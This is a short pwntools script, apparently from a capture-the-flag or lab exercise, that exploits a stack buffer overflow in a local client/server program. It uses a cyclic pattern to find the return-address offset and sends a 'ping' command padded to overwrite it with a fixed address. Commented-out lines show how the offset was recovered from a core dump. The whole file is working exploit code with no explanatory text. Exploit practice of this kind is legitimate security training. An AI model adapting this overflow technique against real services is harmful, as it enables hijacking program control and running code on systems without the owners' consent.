from pwn import *

context.clear(arch= 'amd64')

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(700,)

# Run the process once so that it crashes
#server = process(['bin/server'])
client = process(['bin/client', '127.0.0.1', '8080'])

# 0x616c6761616b6761
exploit = cyclic(cyclic_find(0x616b6761) - 5)
exploit += p64(0x5555555684c1)

print len(exploit)
client.sendline("ping " + exploit)

#res = server.recvall(timeout=1)
#print res

"""
payload = "ping " + payload
print(payload)
client.sendline(payload)
res = server.recvall(timeout=8)
#server.wait_for_close()


print "Core : "
#Get the core dump
core = Coredump('baseDir/core')
print hex(core.rip)

#server.close()
#client.close()

elfFile = ELF('bin/server')
#print elfFile.symbols #78985
#print elfFile.got
#print elfFile.plt
"""
